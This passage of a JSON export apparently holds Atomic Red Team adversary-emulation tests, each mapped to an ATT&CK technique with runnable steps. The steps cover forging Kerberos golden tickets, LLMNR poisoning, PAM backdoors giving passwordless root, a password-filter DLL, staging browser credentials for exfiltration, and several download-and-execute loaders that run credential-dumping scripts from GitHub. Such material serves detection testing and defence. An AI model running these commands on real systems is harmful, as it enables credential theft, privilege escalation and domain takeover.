-ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n", "successCriteria": null}], "techniqueIds": ["clacwm6a9039529mq61jq7jdh"], "tags": []}, {"data": {"name": "Crafting Active Directory golden tickets with mimikatz", "shortName": "T1558.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain_sid | SID of the targeted domain, if you keep default it will automatically get the current domain SID | String | S-1-5-21-DEFAULT | \n | domain | Targeted Active Directory domain FQDN | String | %userdnsdomain% | \n | account | Account to impersonate | String | goldenticketfakeuser | \n | krbtgt_aes256_key | Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain) | String | b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 | \n | mimikatz_path | Mimikatz windows executable | Path | $env:TEMP\\mimikatz\\x64\\mimikatz.exe | "}, "executionSteps": [{"description": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n", "successCriteria": null}], "techniqueIds": ["clacwm6a9039529mq61jq7jdh"], "tags": []}, {"data": {"name": "LLMNR Poisoning with Inveigh (PowerShell)", "shortName": "T1557.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "successCriteria": null}], "techniqueIds": ["clacwm673035s29mq7yy8gc1p"], "tags": []}, {"data": {"name": "Malicious PAM rule", "shortName": "T1556.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_pam_conf | PAM config file to modify. | String | /etc/pam.d/su-l | \n | pam_rule | Rule to add to the PAM config. | String | auth sufficient pam_succeed_if.so uid >= 0 | \n | index | Index where the rule is inserted. | Integer | 1 | "}, "executionSteps": [{"description": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pp02o429mqbbelbm4r"], "tags": []}, {"data": {"name": "Malicious PAM module", "shortName": "T1556.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_pam_conf | PAM config file to modify. | String | /etc/pam.d/su-l | \n | pam_rule | Rule to add to the PAM config. | String | auth sufficient /tmp/pam_evil.so | \n | index | Index where the rule is inserted. | Integer | 1 | \n | path_to_pam_module_source | Path to PAM module source code. | Path | PathToAtomicsFolder/T1556.003/src/pam_evil.c | \n | path_to_pam_module | Path to PAM module object | Path | /tmp/pam_evil.so | "}, "executionSteps": [{"description": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pp02o429mqbbelbm4r"], "tags": []}, {"data": {"name": "Install and Register Password Filter DLL", "shortName": "T1556.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_path | Path to DLL to be installed and registered | Path | PathToAtomicsFolder\\T1556.002\\bin | \n | dll_name | Name of the Password Filter | String | AtomicRedTeamPWFilter.dll | "}, "executionSteps": [{"description": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n", "successCriteria": null}], "techniqueIds": ["clacwm5zf02y229mq20pgcoxx", "clacwm28100n529mq9sl327kj"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - Invoke-WCMDump", "shortName": "T1555.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump", "successCriteria": null}], "techniqueIds": ["clacwm6oq03pe29mqe8j7fg0y"], "tags": []}, {"data": {"name": "Access Saved Credentials via VaultCmd", "shortName": "T1555.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "vaultcmd /listcreds:\"Windows Credentials\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6oq03pe29mqe8j7fg0y"], "tags": []}, {"data": {"name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - mimi-kittenz", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "WinPwn - BrowserPwn", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "WebBrowserPassView - Credentials from Browser", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | webbrowserpassview_path | Path to the WebBrowserPassView executable  | String | PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe | "}, "executionSteps": [{"description": "Start-Process #{webbrowserpassview_path}\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Stage Popular Credential Files for Exfiltration", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Simulating access to Windows Firefox Login Data", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination $env:temp -Force -Recurse\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Simulating access to Windows Edge Login Data", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination $env:temp\\Edge -Force -Recurse\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Simulating access to Opera Login Data", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination $env:temp\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Simulating Access to Chrome Login Data - MacOS", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Simulating access to Chrome Login Data", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination $env:temp\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination $env:temp\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Search macOS Safari Cookies", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | search_string | String to search Safari cookies to find. | String | coinbase | "}, "executionSteps": [{"description": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx", "clacwm1km007k29mq5ky9gts6"], "tags": []}, {"data": {"name": "Run Chrome-password Collector", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of $env:TEMP\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | File path for modified Sysinternals | String | $env:TEMP | "}, "executionSteps": [{"description": "Set-Location -path \"#{file_path}\\Sysinternals\";\n./accesschk.exe -accepteula .;\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx", "clacwm1km007k29mq5ky9gts6"], "tags": []}, {"data": {"name": "LaZagne.py - Dump Credentials from Firefox Browser", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | lazagne_path | Path you put LaZagne Github with LaZagne.py | String | /tmp/LaZagne/Linux | \n | specific_module | You may change the module to \"all\" for all password that can be found by LaZagne.py | string | browsers -firefox | \n | output_file | This is where output for the Firefox passwords goes | String | /tmp/firefox_password.txt | "}, "executionSteps": [{"description": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "LaZagne - Credentials from Browser", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | lazagne_path | Path to LaZagne | Path | PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe | "}, "executionSteps": [{"description": "#{lazagne_path} browsers\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx", "clacwm1km007k29mq5ky9gts6"], "tags": []}, {"data": {"name": "Decrypt Mozilla Passwords with Firepwd.py", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Firepwd_Path | Filepath for Firepwd.py | String | $env:temp\\Firepwd.py | \n | Out_Filepath | Filepath to output results to | String | $env:temp\\T1555.003Test8.txt | \n | VS_CMD_Path | Filepath to Visual Studio Build Tools Command prompt | String | C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat | \n | Python_Path | Filepath to python | String | C:\\Program Files\\Python310\\python.exe | "}, "executionSteps": [{"description": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}\ncat #{Out_Filepath}\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)", "shortName": "T1555.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"$env:temp\" > $null\nRemove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n.\\BrowserCollector.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm65g033y29mqgavphgzx"], "tags": []}, {"data": {"name": "Keychain", "shortName": "T1555.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "### Keychain Files\n\n  ~/Library/Keychains/\n\n  /Library/Keychains/\n\n  /Network/Library/Keychains/\n\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n\n  [Keychain dumper](https://github.com/juuso/keychaindump)\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cert_export | Specify the path of the certificates to export. | Path | /tmp/certs.pem | "}, "executionSteps": [{"description": "security -h\nsecurity find-certificate -a -p > #{cert_export}\nsecurity import #{cert_export} -k\n", "successCriteria": null}], "techniqueIds": ["clacwm5u802t129mq1c9q08et", "clacwm20d00hu29mqc3a4ddex"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - Wifi Credentials", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - lazagne", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  ", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc"], "tags": []}, {"data": {"name": "Extract Windows Credential Manager via VBA", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc", "clacwm1kb007i29mqh1lrdu5i"], "tags": []}, {"data": {"name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "vaultcmd /listcreds:\"Windows Credentials\" /all\n", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc"], "tags": []}, {"data": {"name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "vaultcmd /listcreds:\"Web Credentials\" /all\n", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc"], "tags": []}, {"data": {"name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module will extract the credentials from Windows Credential Manager\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc"], 